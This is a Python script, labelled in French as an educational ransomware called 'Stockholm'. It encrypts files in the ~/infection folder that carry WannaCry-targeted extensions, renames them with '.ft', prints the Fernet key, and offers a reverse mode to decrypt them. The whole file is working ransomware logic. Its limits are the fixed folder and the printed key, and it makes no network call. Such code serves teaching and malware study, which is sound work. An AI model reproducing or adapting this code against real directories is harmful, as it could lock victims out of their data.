import argparse
import sys
from pathlib import Path
from cryptography.fernet import Fernet

# Liste indicative des extensions ciblées par WannaCry
WANNACRY_EXTENSIONS = {
    ".der", ".pfx", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw",
    ".uot", ".3ds", ".max", ".3g2", ".3gp", ".asf", ".asx", ".avi", ".flv", ".m4v",
    ".mov", ".mp4", ".mpg", ".rm", ".swf", ".vob", ".wmv", ".fla", ".rmvb", ".mkv",
    ".flac", ".fla", ".wav", ".nef", ".orc", ".rw2", ".srw", ".arw", ".biq", ".bmp",
    ".jpg", ".jpeg", ".raw", ".tif", ".tiff", ".nef", ".psd", ".asf", ".dbf", ".mdb",
    ".sql", ".vde", ".led", ".msg", ".pfx", ".pdf", ".txt", ".csv", ".doc", ".docx",
    ".xls", ".xlsx", ".ppt", ".pptx", ".zip", ".rar", ".7z"
}

VERSION = "1.0.0"

def get_target_files(infection_dir, reverse=False):
    """Récupère les fichiers à traiter dans le dossier ~/infection."""
    if not infection_dir.exists() or not infection_dir.is_dir():
        print(f"Erreur : Le dossier {infection_dir} n'existe pas.", file=sys.stderr)
        return []

    target_files = []
    for file_path in infection_dir.rglob("*"):
        if file_path.is_file():
            ext = file_path.suffix.lower()
            if reverse:
                # Mode déchiffrement : on ne prend que les fichiers avec l'extension .ft
                if ext == ".ft":
                    target_files.append(file_path)
            else:
                # Mode chiffrement : on ignore les .ft et on filtre sur les extensions WannaCry
                if ext != ".ft" and ext in WANNACRY_EXTENSIONS:
                    target_files.append(file_path)

    return target_files

def encrypt_files(files, cipher, silent):
    """Chiffre les fichiers et ajoute l'extension .ft."""
    for file_path in files:
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = cipher.encrypt(data)

            # Écriture des données chiffrées
            with open(file_path, "wb") as f:
                f.write(encrypted_data)

            # Renommage avec l'extension .ft
            new_path = file_path.with_suffix(file_path.suffix + ".ft")
            file_path.rename(new_path)

            if not silent:
                print(f"[Chiffré] {file_path} -> {new_path}")
        except Exception as e:
            if not silent:
                print(f"Erreur lors du chiffrement de {file_path} : {e}", file=sys.stderr)

def decrypt_files(files, cipher, silent):
    """Déchiffre les fichiers et restaure leur extension d'origine."""
    for file_path in files:
        try:
            with open(file_path, "rb") as f:
                data = f.read()

            decrypted_data = cipher.decrypt(data)

            # Restauration du nom d'origine (suppression de l'extension .ft)
            original_path = file_path.with_suffix("")

            with open(original_path, "wb") as f:
                f.write(decrypted_data)

            # Suppression du fichier chiffré .ft
            file_path.unlink()

            if not silent:
                print(f"[Déchiffré] {file_path} -> {original_path}")
        except Exception:
            if not silent:
                print(f"Erreur : Clé invalide ou fichier corrompu pour {file_path}", file=sys.stderr)

def main():
    # Gestion de la commande 'help' sans tiret
    if len(sys.argv) > 1 and sys.argv[1] == "help":
        sys.argv[1] = "-h"

    parser = argparse.ArgumentParser(
        description="Stockholm - Ransomware éducatif",
        add_help=False
    )

    parser.add_argument("-h", "--help", action="help", help="Affiche ce message d'aide")
    parser.add_argument("-v", "-version", "--version", action="version", version=f"Stockholm {VERSION}")
    parser.add_argument("-r", "-reverse", "--reverse", type=str, metavar="KEY", help="Inverse l'infection avec la clé")
    parser.add_argument("-s", "-silent", "--silent", action="store_true", help="Mode silencieux sans sortie")

    args = parser.parse_args()

    infection_dir = Path.home() / "infection"

    if not infection_dir.exists() or not infection_dir.is_dir():
        print(f"Erreur : Le dossier {infection_dir} n'existe pas.", file=sys.stderr)
        sys.exit(1)

    if args.reverse:
        # Mode Déchiffrement
        try:
            cipher = Fernet(args.reverse.encode())
        except Exception:
            if not args.silent:
                print("Erreur : La clé fournie est invalide.", file=sys.stderr)
            sys.exit(1)

        target_files = get_target_files(infection_dir, reverse=True)
        decrypt_files(target_files, cipher, args.silent)

    else:
        # Mode Chiffrement  
        key = Fernet.generate_key()
        cipher = Fernet(key)

        target_files = get_target_files(infection_dir, reverse=False)
        encrypt_files(target_files, cipher, args.silent)

        if not args.silent:
            print("\nInfection terminée.")
            print(f"Clé de déchiffrement générée : {key.decode()}")

if __name__ == "__main__":
    main()
